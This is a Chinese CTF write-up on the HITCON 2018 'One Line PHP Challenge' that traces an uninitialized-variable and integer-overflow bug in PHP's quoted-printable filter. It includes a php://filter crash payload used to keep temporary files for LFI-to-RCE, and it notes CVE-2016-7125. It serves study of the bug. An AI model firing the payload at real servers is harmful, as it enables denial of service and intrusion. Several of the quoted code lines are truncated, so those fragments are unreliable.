## LFI to RCE
我之前写过一篇，从一道题看LFI 与 RCE里面提到了一种方式，这一篇算是那篇的一个续写  
越来越多的比赛会出一些短小精悍的PHP代码 ，比如[HFCTF 2022]ezPHP等等。这篇文章也是一样，题目出自 **[HITCON CTF
2018]One Line PHP Challenge** 。
题目环境：
  * Ubuntu 18.04 + PHP 7.2 + Apache
### 题目源码
    lbchars_len + 1) {
            err = PHP_CONV_ERR_TOO_BIG;
            break;
        }
        *(pd++) = '=';
        ocnt--;
        line_ccnt--;
        memcpy(pd, inst->lbchars, inst->lbchars_len);
        pd += inst->lbchars_len;
        ocnt -= inst->lbchars_len;
        line_ccnt = inst->line_len;
    }
而在一开始，`isnt`初始化，
    case PHP_CONV_QPRINT_ENCODE: {
    unsigned int line_len = 0;
    char *lbchars = NULL;
    size_t lbchars_len;
    int opts = 0;
    if (options != NULL) {
            ...
    }
    retval = pemalloc(sizeof(php_conv_qprint_encode), persistent);
        if (lbchars != NULL) {
        ...
    } else {
            if (php_conv_qprint_encode_ctor((php_conv_qprint_encode *)retval, 0, NULL, 0, 0, opts, persistent)) {
            goto out_failure;
            }
        }
    } break;
然后`lbchars_len`进行赋值
    static php_conv_err_t php_conv_qprint_encode_ctor(php_conv_qprint_encode *inst, unsigned int line_len, const char *lbchars, size_t lbchars_len, int lbchars_dup, int opts, int persistent)
    {
        if (line_len _super.convert_op = (php_conv_convert_func) php_conv_qprint_encode_convert;
        inst->_super.dtor = (php_conv_dtor_func) php_conv_qprint_encode_dtor;
        inst->line_ccnt = line_len;
        inst->line_len = line_len;
        if (lbchars != NULL) {
            inst->lbchars = (lbchars_dup ? pestrdup(lbchars, persistent) : lbchars);
            inst->lbchars_len = lbchars_len;
        } else {
            inst->lbchars = NULL;
        }
        inst->lbchars_dup = lbchars_dup;
        inst->persistent = persistent;
        inst->opts = opts;
        inst->lb_cnt = inst->lb_ptr = 0;
        return PHP_CONV_ERR_SUCCESS;
    }
可以看出，因为我们使用`php://`没有对`convert.quoted-printable-encode`附加`options`,
所以这里的`options`就是`NULL`，一直到了`else`分支, 我们可以看到传的参数为`(php_conv_qprint_encode
*)retval, 0, NULL, 0, 0, opts, persistent)`
因此，`lbchars`为`NULL`，导致`lbchars_len`没有被赋值，所以`inst->lbchars_len`变量未初始化调用。
根据定义，我们知道`lbchars_len`长度为`8bytes`，通过调整`附加data`的长度，会有一些request报文头的`8bytes`被存储到`inst->lbchars_len`
    } else {
        if (line_ccnt lbchars_len + 1) {
                err = PHP_CONV_ERR_TOO_BIG;//BUG的成因
                break;
            }
            *(pd++) = '=';
            ocnt--;
            line_ccnt--;
            memcpy(pd, inst->lbchars, inst->lbchars_len);
            pd += inst->lbchars_len;
            ocnt -= inst->lbchars_len;
            line_ccnt = inst->line_len;
        }
        if (ocnt > 4)];
        *(pd++) = qp_digits[(c & 0x0f)];
        ocnt -= 3;
        line_ccnt -= 3;
        if (trail_ws > 0) {
            trail_ws--;
        }
        CONSUME_CHAR(ps, icnt, lb_ptr, lb_cnt);
    }
可以发现`memcpy`的位置第二个参数是`NULL`，第一个，第三个参数可控，如果被调用，会导致一个`segfault`，从而在`tmp`下驻留文件，但是我们无法使用`%00`，如何让`ocnt
lbchars_len + 1`不成立呢？(`ocnt`为data的长度)，这里就要利用整数溢出，将`lbchars_len +
1`溢出到0。这样我们就可以控制`inst->lbchars_len`的值了，但是因为`php://`的`resource`内容不能包含`\x00`，所以只能构造`\x01`-`\xff`的内容。
**综上分析：**
  * `inst->lbchars_len`可控且存在整数溢出
  * `inst->lbchars_len` 变量未初始化调用
    php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
POC会导致PHP崩溃，临时文件会永久保存。
### CVE-2016-7125
5.6.25 之前的 PHP 和 7.0.10 之前的 7.x 中的 ext/session/session.c
以触发错误解析的方式跳过无效的会话名称，这允许远程攻击者通过控制会话来注入任意类型的会话数据名称
根据我们上面的POC进行测试漏洞影响版本。
#### 影响版本测试
我用docker测试的，实测的话，PHP<7.4 & PHP<5.6.25 两种都可实现
  * PHP-7.1.3
  * PHP-5.6.28
当前版本下的PHP不会引起崩溃